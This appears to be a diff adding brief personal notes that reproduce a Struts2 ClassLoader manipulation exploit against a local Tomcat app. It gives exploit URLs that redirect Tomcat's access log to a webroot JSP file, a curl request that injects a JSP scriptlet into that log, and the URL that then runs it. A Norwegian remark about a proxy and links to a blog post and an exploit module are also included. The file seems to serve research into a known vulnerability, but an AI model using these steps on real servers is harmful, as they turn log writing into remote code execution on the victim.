@@ -1,0 +1,16 @@
+http://localhost:8080/Struts-0.0.2-SNAPSHOT/hello.action?class[%27classLoader%27].resources.context.parent.pipeline.first.directory=webapps/ROOT&class[%27classLoader%27].resources.context.parent.pipeline.first.prefix=abcd&class[%27classLoader%27].resources.context.parent.pipeline.first.suffix=.jsp&class[%27classLoader%27].resources.context.parent.pipeline.first.fileDateFormat=12
+
+
+curl "http://localhost:8080/<% System.exit(1); %>"
+
+http://localhost:8080/abcd12.jsp
+
+
+
+Kjøre node http-proxy forann tomcat for å legge på x-access-control-* headers
+
+
+
+http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/
+
+http://downloads.securityfocus.com/vulnerabilities/exploits/65999.rb
